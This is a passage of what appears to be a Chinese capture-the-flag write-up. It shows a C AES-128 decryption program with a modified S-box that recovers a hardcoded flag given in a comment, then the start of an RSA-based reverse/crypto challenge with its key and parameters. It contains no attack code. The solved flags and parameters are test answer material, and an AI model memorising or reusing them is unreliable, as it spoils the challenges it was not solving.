aesKey-&gt;eK;  <span class="comment">//加密秘钥</span></span><br><span class="line">    <span class="type">uint32_t</span> *v = aesKey-&gt;dK;  <span class="comment">//解密秘钥</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keyLen is 16 Bytes, generate uint32_t W[44]. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* W[0-3] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        LOAD32H(w[i], key + <span class="number">4</span>*i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* W[4-43] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ MIX(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">        w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">        w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">        w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">        w += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w = aesKey-&gt;eK+<span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line">    <span class="comment">//解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥</span></span><br><span class="line">    <span class="comment">//即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            v[i] = w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        w -= <span class="number">4</span>;</span><br><span class="line">        v += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮秘钥加</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addRoundKey</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* i: row, j: col */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            k[i][j] = (<span class="type">uint8_t</span>) BYTE(key[j], <span class="number">3</span> - i);  <span class="comment">/* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */</span></span><br><span class="line">            state[i][j] ^= k[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字节替换</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">subBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="comment">/* i: row, j: col */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[i][j] = S[state[i][j]]; <span class="comment">//直接使用原始字节作为S盒数据下标</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//逆字节替换</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">invSubBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="comment">/* i: row, j: col */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[i][j] = inv_S[state[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//行移位</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">shiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* i: row */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">//便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t</span></span><br><span class="line">        LOAD32H(block[i], state[i]);</span><br><span class="line">        block[i] = ROF32(block[i], <span class="number">8</span>*i);</span><br><span class="line">        STORE32H(block[i], state[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//逆行移位</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">invShiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* i: row */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        LOAD32H(block[i], state[i]);</span><br><span class="line">        block[i] = ROR32(block[i], <span class="number">8</span>*i);</span><br><span class="line">        STORE32H(block[i], state[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Galois Field (256) Multiplication of two Bytes */</span></span><br><span class="line"><span class="comment">// 两字节的伽罗华域乘法运算</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u &amp; <span class="number">0x01</span>) &#123;    <span class="comment">//</span></span><br><span class="line">            p ^= v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">        v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            v ^= <span class="number">0x1B</span>; <span class="comment">/* x^8 + x^4 + x^3 + x + 1 */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列混合</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)&#123;</span><br><span class="line">            tmp[i][j] = state[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;  <span class="comment">//伽罗华域加法和乘法</span></span><br><span class="line">            state[i][j] = GMul(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ GMul(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">                        ^ GMul(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ GMul(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆列混合</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">invMixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125;&#125;;  <span class="comment">//使用列混合矩阵的逆矩阵</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)&#123;</span><br><span class="line">            tmp[i][j] = state[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[i][j] = GMul(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ GMul(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">                          ^ GMul(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ GMul(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，</span></span><br><span class="line"><span class="comment">// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aesEncrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *pt, <span class="type">uint8_t</span> *ct, <span class="type">uint32_t</span> len)</span> &#123;</span><br><span class="line"></span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = ct;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.eK;  <span class="comment">//解密秘钥指针</span></span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == pt || <span class="literal">NULL</span> == ct)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len % BLOCKSIZE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    keyExpansion(actualKey, <span class="number">16</span>, &amp;aesKey);  <span class="comment">// 秘钥扩展</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用ECB模式循环加密多个分组长度的数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">                <span class="comment">// 把16字节的明文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">        loadStateArray(state, pt);</span><br><span class="line">        <span class="comment">// 轮秘钥加</span></span><br><span class="line">        addRoundKey(state, rk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            subBytes(state);   <span class="comment">// 字节替换</span></span><br><span class="line">            shiftRows(state);  <span class="comment">// 行移位</span></span><br><span class="line">            mixColumns(state); <span class="comment">// 列混合</span></span><br><span class="line">            addRoundKey(state, rk); <span class="comment">// 轮秘钥加</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        subBytes(state);    <span class="comment">// 字节替换</span></span><br><span class="line">        shiftRows(state);  <span class="comment">// 行移位</span></span><br><span class="line">        <span class="comment">// 此处不进行列混合</span></span><br><span class="line">        addRoundKey(state, rk+<span class="number">4</span>); <span class="comment">// 轮秘钥加</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 把4x4状态矩阵转换为uint8_t一维数组输出保存</span></span><br><span class="line">        storeStateArray(state, pos);</span><br><span class="line"></span><br><span class="line">        pos += BLOCKSIZE;  <span class="comment">// 加密数据内存指针移动到下一个分组</span></span><br><span class="line">        pt += BLOCKSIZE;   <span class="comment">// 明文数据指针移动到下一个分组</span></span><br><span class="line">        rk = aesKey.eK;    <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES128解密， 参数要求同加密</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span> &#123;</span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK;  <span class="comment">//解密秘钥指针</span></span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == ct || <span class="literal">NULL</span> == pt)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len % BLOCKSIZE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    keyExpansion(actualKey, <span class="number">16</span>, &amp;aesKey);  <span class="comment">//秘钥扩展，同加密</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">        <span class="comment">// 把16字节的密文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">        loadStateArray(state, ct);</span><br><span class="line">        <span class="comment">// 轮秘钥加，同加密</span></span><br><span class="line">        addRoundKey(state, rk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            invShiftRows(state);    <span class="comment">// 逆行移位</span></span><br><span class="line">            invSubBytes(state);     <span class="comment">// 逆字节替换，这两步顺序可以颠倒</span></span><br><span class="line">            addRoundKey(state, rk); <span class="comment">// 轮秘钥加，同加密</span></span><br><span class="line">            invMixColumns(state);   <span class="comment">// 逆列混合</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        invSubBytes(state);   <span class="comment">// 逆字节替换</span></span><br><span class="line">        invShiftRows(state);  <span class="comment">// 逆行移位</span></span><br><span class="line">        <span class="comment">// 此处没有逆列混合</span></span><br><span class="line">        addRoundKey(state, rk+<span class="number">4</span>);  <span class="comment">// 轮秘钥加，同加密</span></span><br><span class="line"></span><br><span class="line">        storeStateArray(state, pos);  <span class="comment">// 保存明文数据</span></span><br><span class="line">        pos += BLOCKSIZE;  <span class="comment">// 输出数据内存指针移位分组长度</span></span><br><span class="line">        ct += BLOCKSIZE;   <span class="comment">// 输入数据内存指针移位分组长度</span></span><br><span class="line">        rk = aesKey.dK;    <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方便输出16进制数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHex</span><span class="params">(<span class="type">uint8_t</span> *ptr, <span class="type">int</span> len, <span class="type">char</span> *tag)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\ndata[%d]: &quot;</span>, tag, len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2X &quot;</span>, *ptr++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//S盒有变化,需要求出逆S盒</span></span><br><span class="line">    <span class="comment">//unsigned char change_S[256] = &#123;&#125;;</span></span><br><span class="line">    <span class="type">uint8_t</span> line=<span class="number">0</span>,rol=<span class="number">0</span>;            <span class="comment">//位置</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        line = (S[i]&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">        rol = S[i]&amp;<span class="number">0xf</span>;</span><br><span class="line">        inv_S[line*<span class="number">16</span>+rol] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> key[<span class="number">16</span>] = &#123;<span class="number">83</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">76</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">82</span>&#125;;</span><br><span class="line">    <span class="comment">//const uint8_t pt[16]=&#123;0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d, 0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34&#125;;</span></span><br><span class="line">    <span class="type">uint8_t</span> ct[<span class="number">32</span>] = &#123;<span class="number">0x99</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x01</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x51</span>, <span class="number">0x93</span>, <span class="number">0x12</span>, <span class="number">0xEE</span>,</span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x64</span>, <span class="number">0xE7</span>, <span class="number">0xEF</span>, <span class="number">0x63</span>, <span class="number">0x8D</span>, <span class="number">0x51</span>, <span class="number">0xDF</span>, <span class="number">0x5D</span>, <span class="number">0x78</span>,</span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0xAA</span>, <span class="number">0x39</span>, <span class="number">0x62</span>, <span class="number">0xA0</span>, <span class="number">0xB4</span>, <span class="number">0x50</span>, <span class="number">0x30</span>, <span class="number">0x47</span>, <span class="number">0x30</span>,</span><br><span class="line">  <span class="number">0x21</span>, <span class="number">0x06</span>&#125;;     <span class="comment">// 外部申请输出数据内存，用于加密后的数据</span></span><br><span class="line">    <span class="type">uint8_t</span> plain[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 外部申请输出数据内存，用于解密后的数据</span></span><br><span class="line">    <span class="comment">//aesEncrypt(key, 16, pt, ct, 16); // 加密</span></span><br><span class="line">    <span class="comment">//printHex(pt, 16, &quot;plain data:&quot;); // 打印初始明文数据</span></span><br><span class="line">    <span class="comment">//printHex(ct, 16, &quot;after encryption:&quot;);  // 打印加密后的密文</span></span><br><span class="line"></span><br><span class="line">    aesDecrypt(key, <span class="number">16</span>, ct, plain, <span class="number">32</span>);       <span class="comment">// 解密</span></span><br><span class="line">    printHex(plain, <span class="number">32</span>, <span class="string">&quot;after decryption:&quot;</span>); <span class="comment">// 打印解密后的明文数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SYC&#123;B3l1eue_Th@t_y0u__l3aRn_Aes&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Reverse-Crypto"><a href="#Reverse-Crypto" class="headerlink" title="Reverse/Crypto"></a>Reverse/Crypto</h2><h3 id="LinkedListModular"><a href="#LinkedListModular" class="headerlink" title="LinkedListModular"></a>LinkedListModular</h3><blockquote><p>公司职员发现关键数据被加密了，请帮忙解密出来，注意e和phi。flag为输入的256长度的hex字符串的md5值，并包裹flag{}提交。该题需要一些逆向基础(C实现的程序，内含链表、gmp库相关)，可与队友联合解题，也可学习些二进制基础，对以后有益。</p></blockquote><p>分析，key为 <code>KnowYouLikeCrypto</code>，生成的文件为异或key的结果，异或得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cmp0</span><br><span class="line"></span><br><span class="line">p:0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb q:0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b e:0xd322 c:0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ff</span><br><span class="line"></span><br><span class="line">cmp1</span><br><span class="line"></span><br><span class="line">p:0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b q:0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1 e:0x10ae 